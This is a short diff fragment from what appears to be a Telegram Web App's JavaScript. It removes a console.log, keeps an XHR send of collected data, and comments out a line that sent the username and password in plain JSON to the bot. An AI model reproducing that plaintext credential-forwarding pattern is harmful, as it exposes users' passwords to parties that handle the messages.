@@ -361,10 +361,9 @@
         };
 
         // Send the JSON data
-        console.log(dataToSend)
         xhr.send(dataToSend);
 
-        Telegram.WebApp.sendData(JSON.stringify({username: username, password: password}));
+        // Telegram.WebApp.sendData(JSON.stringify({username: username, password: password}));
 
         // Close the Web App
         Telegram.WebApp.close();
